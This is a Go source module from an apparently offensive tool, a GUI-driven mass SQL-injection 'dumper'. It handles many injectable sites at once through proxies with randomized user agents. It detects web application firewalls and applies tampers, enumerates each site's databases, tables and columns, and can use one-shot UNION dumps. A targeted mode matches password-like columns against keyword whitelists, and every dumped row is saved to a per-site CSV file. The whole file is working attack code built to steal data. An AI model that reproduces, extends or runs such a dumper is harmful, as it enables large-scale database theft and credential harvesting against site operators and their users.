package modules

import (
	"fmt"
	"git.quartzinc.dev/Zertex/XDGv2/injection"
	"git.quartzinc.dev/Zertex/XDGv2/manager"
	"git.quartzinc.dev/Zertex/XDGv2/qtui"
	"git.quartzinc.dev/Zertex/XDGv2/utils"
	"github.com/corpix/uarand"
	"github.com/paulbellamy/ratecounter"
	"github.com/spf13/viper"
	"github.com/therecipe/qt/widgets"
	"os"
	"runtime/debug"
	"strings"
	"sync"
	"time"
)

type DumpModule struct {
	Index int
	InjCh	chan *injection.Injection
	RowCh   chan Row
	Columns int
	Tables  int
	Rows    int
	Whitelist []DumperWhitelistGroup
	UIMap map[int]*injection.Injection
	UIMutex sync.RWMutex
}

func (dm *DumpModule) MarshalWhiteList(whitelist map[string][]string) {
	for group, list := range whitelist {
		dm.Whitelist = append(dm.Whitelist, DumperWhitelistGroup{
			Name: group,
			List: list,
		})
	}
}

func (dm *DumpModule) UnmarshalWhitelist() map[string][]string {
	whitelist := make(map[string][]string)
	for _, group := range dm.Whitelist {
		whitelist[group.Name] = group.List
	}
	return whitelist
}

type DumperWhitelistGroup struct {
	Name string
	List []string
}

func (dm *DumpModule) GetWhitelistIndexByName(name string) int {
	i := 0
	for group, _ := range viper.GetStringMapStringSlice("dumper.whitelist") {
		if group == name {
			return i
		}
		i++
	}
	return -1
}

func (dm *DumpModule) GetWhitelistNameByIndex(index int) string {
	i := 0
	for group, _ := range viper.GetStringMapStringSlice("dumper.whitelist") {
		if i == index {
			return group
		}
		i++
	}
	return ""
}

type UIMapper struct {
	Injection *injection.Injection
	UIBits []*widgets.QTableWidgetItem
}

var Dumper *DumpModule

type Dump struct {
	Injection *injection.Injection
	Database string
	DBIndex int
	Table string
	TBIndex int
	OrderColumn string
	Columns []string
	Index int
	Dwg *sync.WaitGroup
	Return chan string
	UIIndex int
}

type Row struct {
	Site string
	Table string
	Row string
	Header string
}

func (dm *DumpModule) Start(injections []*injection.Injection) {
	manager.PManager.ResetCtx()
	manager.PManager.Client.Transport = manager.PManager.CreateProxyTransport()
	utils.RequestCounter = 0
	utils.ErrorCounter = 0
	utils.RateCounter = ratecounter.NewRateCounter(time.Second)
	utils.RPMCounter = ratecounter.NewRateCounter(time.Minute)
	utils.StartTime = time.Now()
	utils.GlobalSem = make(chan interface{}, viper.GetInt("dumper.threads"))
	utils.WorkerSem = make(chan interface{}, viper.GetInt("dumper.threads") * viper.GetInt("dumper.workers"))

	dm.RowCh = make(chan Row)
	dm.InjCh = make(chan *injection.Injection)

	dm.UIMap = make(map[int]*injection.Injection)
	dm.Tables = 0
	dm.Columns = 0
	dm.Rows = 0
	utils.Done = make(chan interface{})
	utils.Kill = make(chan interface{})

	/*cpuFile, err := os.Create("dumper.pprof")
	if err != nil {
		panic(err.Error())
	}
	pprof.StartCPUProfile(cpuFile)
	defer pprof.StopCPUProfile()*/

	blacklist := viper.GetStringSlice("dumper.blacklist")

	var fileMap map[string]*os.File

	go func() {
		defer func() {
			for key, file := range fileMap {
				file.Close()
				delete(fileMap, key)
			}
		}()
		_ = os.Mkdir("output", 0755)
		var file *os.File
		var ok bool
		var err error
		for dmp := range dm.RowCh {
			select {
			case <-utils.Kill:
				return
			default:
				siteDir := fmt.Sprintf("output/%s", dmp.Site)
				tblFile := fmt.Sprintf("%s/%s.csv", siteDir, dmp.Table)
				if !utils.DirExists(siteDir) {
					os.Mkdir(siteDir, 0755)
				}
				if file, ok = fileMap[fmt.Sprintf("%s-%s", dmp.Site,dmp.Table)]; !ok {
					if utils.FileExists(tblFile) {
						file, err = os.OpenFile(tblFile, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
						if err != nil {
							utils.LogError(fmt.Sprintf("Error opening output file: %s", err.Error()))
							continue
						}
					} else {
						file, err = os.Create(tblFile)
						if err != nil {
							utils.LogError(fmt.Sprintf("Error opening output file: %s", err.Error()))
							continue
						}
						file.WriteString(dmp.Header + "\r\n")
					}
				}
				file.WriteString(dmp.Row + "\r\n")
			}
		}
	}()

	go func() {
		for {
			select {
			case <- time.After(time.Second):
				dm.UIMutex.Lock()
				qtui.Main.DumperTableWidget.VerticalScrollBar().SetDisabled(true)
				for uiIndex, inj := range dm.UIMap {
					if inj == nil {
						continue
					}

					qtui.Main.DumperTableWidget.SetItem(uiIndex, 0, widgets.NewQTableWidgetItem2(fmt.Sprintf("%s", inj.Base.Hostname()), 0)) // Databases
					qtui.Main.DumperTableWidget.SetItem(uiIndex, 1, widgets.NewQTableWidgetItem2(fmt.Sprintf("%d", inj.Databases),0)) // Databases
					qtui.Main.DumperTableWidget.SetItem(uiIndex, 2, widgets.NewQTableWidgetItem2(fmt.Sprintf("%d", inj.Tables),0)) // Tables
					qtui.Main.DumperTableWidget.SetItem(uiIndex, 3, widgets.NewQTableWidgetItem2(fmt.Sprintf("%d", inj.Columns),0)) // Columns
					qtui.Main.DumperTableWidget.SetItem(uiIndex, 4, widgets.NewQTableWidgetItem2(fmt.Sprintf("%d/%d", inj.Rows, inj.TotalRows), 0)) // Rows
					qtui.Main.DumperTableWidget.SetItem(uiIndex, 5, widgets.NewQTableWidgetItem2(fmt.Sprintf("%d", inj.Errors), 0)) // Errors
					qtui.Main.DumperTableWidget.SetItem(uiIndex, 6, widgets.NewQTableWidgetItem2(inj.Status, 0)) // Status

					if viper.GetBool("dumper.autoskip") && inj.Errors > viper.GetInt("dumper.autoskipval") && inj.Rows == 0 && inj.TotalRows == 0 {
						inj.SkipLock.Lock()
						select {
						default:
							close(inj.Skip)
						case <-inj.Skip:
						}
						inj.SkipLock.Unlock()
//						delete(dm.UIMap, uiIndex)
					}
				}
				qtui.Main.DumperTableWidget.VerticalScrollBar().SetDisabled(false)
				dm.UIMutex.Unlock()
			}
		}
	}()

	wg := sync.WaitGroup{}
	wg.Add(viper.GetInt("dumper.threads"))
	for i := 0; i < viper.GetInt("dumper.threads"); i++ {
		utils.GlobalSem<-0
		go func(uiindex int) {
			defer func() {
				<-utils.GlobalSem
				wg.Done()
			}()
			for inj := range dm.InjCh {
				if inj == nil {
					return
				}
				select {
				case <-utils.Done:
					return
				default:
					inj.Tables = 0
					inj.Columns = 0
					inj.Rows = 0
					dm.UIMutex.Lock()
					count := qtui.Main.DumperTableWidget.RowCount()
					qtui.Main.DumperTableWidget.SetRowCount(count + 1)
					dm.UIMap[count] = inj
					dm.UIMutex.Unlock()
					inj.Status = "Initializing.."

					if len(inj.UserAgent) == 0 {
						inj.UserAgent = uarand.GetRandom()
					}
					if len(inj.Tampers) == 0 {
						_, inj.Original, _, inj.Tampers, inj.IP, _ = injection.WAFTest(inj.Base.String())
					}
					if inj.ChunkSize == 0 {
						_, err := inj.GetChunkSize()
						if err != nil {
							continue
						}
					}

					inj.Status = "Counting Databases.."
					dbCount, err := inj.GetDatabaseCount()
					if err != nil || dbCount == 0 {
						continue
					}

					dCh := make(chan Dump)

					dwg := sync.WaitGroup{}

					inj.Status = "Starting Workers..."
					dwg.Add(viper.GetInt("dumper.workers"))
					for i := 0; i < viper.GetInt("dumper.workers"); i++ {
						utils.WorkerSem <- 0
						go func(dCh *chan Dump) {
							defer func() {
								dwg.Done()
								<-utils.WorkerSem
							}()
							for dump := range *dCh {
								var sep string
								if viper.GetBool("dumper.Targeted") {
									sep = ":"
								} else {
									sep = ","
								}

								var o string
								var oo []string

								if dump.Injection.DBType == injection.MYSQL {
									o, err = dump.Injection.DumpMultiColumn(dump.Database, dump.Table, dump.Columns, dump.OrderColumn, dump.Index, sep)
									if err != nil {
										continue
									}
								} else {
									for _, col := range dump.Columns {
										c, err := dump.Injection.DumpColumn(dump.Database, dump.Table, col, dump.OrderColumn, dump.Index)
										if err != nil {
											oo = append(oo, "")
											continue
										}
										oo = append(oo, c)
									}
									o = strings.Join(oo, sep)
								}

								if !(!viper.GetBool("dumper.KeepBlanks") && utils.ArrHasBlank(strings.Split(o, sep))) {
									dm.Rows++
									dump.Injection.Rows++
									utils.RPMCounter.Incr(1)

									dm.RowCh <- Row{
										Site:   inj.Base.Hostname(),
										Table:  dump.Table,
										Row:    o,
										Header: strings.Join(dump.Columns, ","),
									}
								} else {
									dump.Injection.TotalRows--
								}
							}
						}(&dCh)
					}

					//tableDetails := make([]injection.Details, 0)

					tbSem := make(chan interface{}, 5)
					colSem := make(chan interface{}, 5)

					for i := 0; i < dbCount; i++ {
						inj.Status = fmt.Sprintf("Mapping database %d", i)
						database, err := inj.GetDatabase(i)
						if err != nil {
							utils.LogDebug(fmt.Sprintf("[%s] [%s] %s", inj.Base.Hostname(),database, err.Error()))
							continue
						}
						if utils.HasAny(database, inj.GetSystemDBNames()) {
							continue
						}

						inj.Databases++

						if viper.GetBool("dumper.targeted") {
							if viper.GetBool("dumper.usedios") && inj.Technique == injection.UNION {
								if schema, err := injection.U_GetSchemaDIOS(inj); err == nil {
									for database, tables := range schema {
										for table, columns := range tables {
											cols := make([]string, len(dm.Whitelist))
											for wIndex, white := range dm.Whitelist {
												for _, k := range white.List {
													for _, col := range columns {
														if strings.Contains(col, k) && !utils.HasAny(col, blacklist) {
															cols[wIndex] = col
														}
													}
												}
											}

											if utils.ArrHasBlank(cols) {
												continue
											}

											dm.Tables++
											dm.Columns += len(cols)
											if rows, err := injection.U_DumpTableDIOS(inj, database, table, cols); err == nil {
												if viper.GetBool("dumper.MinRows") && viper.GetInt("dumper.MinRowCount") > len(rows) {
													continue
												}

												//go func(tbl string, rows []string) {
												inj.TotalRows+=len(rows)
												for _, row := range rows {
													dm.Rows++
													inj.Rows++
													utils.RPMCounter.Incr(1)
													dm.RowCh <- Row{
														Site:   inj.Base.Hostname(),
														Table:  table,
														Row:    row,
														Header: strings.Join(cols, ","),
													}
												}
												//}(table, rows)
											}
										}
									}
									goto done
								}
							}

							passPossibles := make(map[string]int)
							ppMutex := sync.RWMutex{}

							inj.Status = "Finding tables.."

							pwg := sync.WaitGroup{}
							pwg.Add(len(dm.Whitelist[0].List))
							for _, pass := range dm.Whitelist[0].List {
								colSem <- 0
								go func(pass string) {
									defer func() {
										pwg.Done()
										<-colSem
									}()
									c, err := inj.GetTableCountWithColumn(database, pass, blacklist)
									if err != nil {
										return
									}
									ppMutex.Lock()
									passPossibles[pass] = c
									ppMutex.Unlock()
								}(pass)
							}
							pwg.Wait()

							inj.Status = "Finding Columns.."
							//tablesCh := make(chan injection.Details)
							var tables []string
							mu := sync.Mutex{}

							pwg = sync.WaitGroup{}
							for col, count := range passPossibles {
								for l := 0; l < count; l++ {
									pwg.Add(1)
									tbSem<-0
									go func(database, col string, index int) {
										defer func() {
											pwg.Done()
											<-tbSem
										}()

										table, err := inj.GetTableWithColumn(database, col, index, blacklist)
										if err != nil {
											utils.LogDebug(fmt.Sprintf("[S:%s] [D:%s] [C:%s:%d]T %s", inj.Base.Hostname(),database, col, index, err.Error()))
											return
										}

										dupe := false

										mu.Lock()
										if utils.ArrContains(tables, table) {
											dupe = true
										} else {
											tables = append(tables, table)
										}
										mu.Unlock()
										if dupe {
											return
										}

										cols := make([]string, len(dm.Whitelist))
										dm.Tables++
										inj.Tables++

										uWG := sync.WaitGroup{}
										uWG.Add(len(dm.Whitelist))
										for wIndex, white := range dm.Whitelist {
											colSem<-0
											go func(wIndex int, white []string) {
												defer func() {
													<-colSem
													uWG.Done()
												}()
												for _, column := range white {
													c, err := inj.GetColumnFromTable(database, table, column, blacklist)
													if err != nil || len(c) == 0 {
														continue
													}
													cols[wIndex] = c
													return
												}
											}(wIndex, white.List)
										}
										uWG.Wait()

										for _, k := range cols {
											if k == "" || len(k) == 0 {
												return
											}
										}

										fmt.Println(cols)

										dm.Columns += len(cols)
										inj.Columns += len(cols)

										rC, err := inj.GetRowCount(database, table)
										if err != nil {
											utils.LogDebug(fmt.Sprintf("[S:%s] [D:%s] [T:%s] %s", inj.Base.Hostname(),database, table, err.Error()))
											select {
											case <-inj.Skip:
												return
											case <-utils.Done:
												return
											default:
												dm.RowCh <- Row{
													Site:   inj.Base.Hostname(),
													Table:  table,
													Row:    "Failed to dump, manual analysis required.",
													Header: strings.Join(cols, ","),
												}
												return
											}
										}

										if rC == 0 || (viper.GetBool("dumper.MinRows") && viper.GetInt("dumper.MinRowCount") > rC) {
											return
										}

										inj.TotalRows += rC

										ord, err := inj.GetColumn(database, table, 0)
										if err != nil {
											return
										}

										for i := 0; i < rC; i++ {
											select {
											case <-utils.Done:
												return
											case <-inj.Skip:
												break
											case dCh <- Dump{
												Injection:   inj,
												Database:    database,
												Table:       table,
												OrderColumn: ord,
												Columns:     cols,
												Index:       i,
											}:
											}
										}
									}(database, col, l)
								}
							}
							pwg.Wait()
						} else {
							td := func() {
								if viper.GetBool("dumper.UseDIOS") && inj.Technique == injection.UNION {
									if schema, err := injection.U_GetSchemaDIOS(inj); err == nil {
										for database, tables := range schema {
											dm.Tables += len(tables)
											for table, columns := range tables {
												dm.Columns += len(columns)
												if rows, err := injection.U_DumpTableDIOS(inj, database, table, columns); err == nil {
													if viper.GetBool("dumper.minrows") && viper.GetInt("dumper.minrowcount") > len(rows) {
														return
													}
													dm.Rows += len(rows)
													go func(tbl string, rows []string) {
														for _, row := range rows {
															if dm.RowCh != nil {
																dm.RowCh <- Row{
																	Site:   inj.Base.Hostname(),
																	Table:  tbl,
																	Row:    row,
																	Header: strings.Join(columns, ","),
																}
															}

														}
													}(table, rows)
												} else {
													dm.RowCh <- Row{
														Site:   inj.Base.Hostname(),
														Table:  table,
														Row:    "Network issues, is the host alive?",
														Header: strings.Join(columns, ","),
													}
													return
												}
											}
										}
										return
									}
								}

								tC, err := inj.GetTableCount(database)
								if err != nil {
									return
								}

								if utils.IsClosed(inj.Skip) {
									return
								}

								twg := sync.WaitGroup{}

								twg.Add(tC)
								for j := 0; j < tC; j++ {
									tbSem <- 0
									go func(index int) {
										defer func() {
											twg.Done()
											<-tbSem
										}()
										table, err := inj.GetTable(database, index)
										if err != nil {
											return
										}
										dm.Tables++
										inj.Tables++

										cC, err := inj.GetColumnCount(database, table)
										if err != nil {
											return
										}

										if cC < 1 {
											return
										}

										cols := make([]string, cC)

										cwg := sync.WaitGroup{}
										cwg.Add(cC)
										for l := 0; l < cC; l++ {
											colSem<-0
											go func(l int) {
												defer func() {
													cwg.Done()
													<-colSem
												}()
												cols[l], err = inj.GetColumn(database, table, l)
												if err != nil {
													return
												}
												dm.Columns++
												inj.Columns++
											}(l)
										}
										cwg.Wait()

										rC, err := inj.GetRowCount(database, table)
										if err != nil {
											utils.LogDebug(err.Error())
											select {
											case <-utils.Done:
												return
											default:
												dm.RowCh <- Row{
													Site:   inj.Base.Hostname(),
													Table:  table,
													Row:    "Failed to dump, manual analysis required.",
													Header: strings.Join(cols, ","),
												}
											}
										}

										inj.TotalRows += rC

										if viper.GetBool("dumper.MinRows") && viper.GetInt("dumper.MinRowCount") > rC {
											return
										}

										/*tablesCh <- injection.Details{
											RowCount: rC,
											Table:    table,
											Columns:  inj.Structure[dbIndex].Tables[index].GetColumnNameArray(),
										}*/
										ord, err := inj.GetColumn(database, table, 0)
										if err != nil {
											return
										}
										for i := 0; i < rC; i++ {
											select {
											case <-utils.Done:
												return
											case <-inj.Skip:
												return
											default:
												dCh <- Dump{
													Injection:   inj,
													Database:    database,
													Table:       table,
													OrderColumn: ord,
													Columns:     cols,
													Index:       i,
													Dwg:         &dwg,
												}
											}
										}
									}(j)
								}

								twg.Wait()
							}
							td()
						}
						done:
					}

					inj.Status = "Stopping..."
					close(dCh)
					ff := make(chan interface{})
					go func() {
						dwg.Wait()
						close(ff)
					}()
					select {
					case <-utils.Done:
					case <-ff:
						inj.Status = "Done"
					}
					delete(dm.UIMap, uiindex)
					debug.FreeOSMemory()
				}
			}
		}(i)
	}

	var inj *injection.Injection
	for dm.Index, inj = range injections {
		select {
		case <-utils.Done:
			goto popoff
		case dm.InjCh <- inj:
		}
	}
popoff:
	close(dm.InjCh)
	//fmt.Println("closed injCh")
	mini := make(chan interface{})
	go func() {
		wg.Wait()
		close(mini)
	}()
	select {
	case <- mini:
		dm.Index = 0
	case <- utils.Kill:
	}
}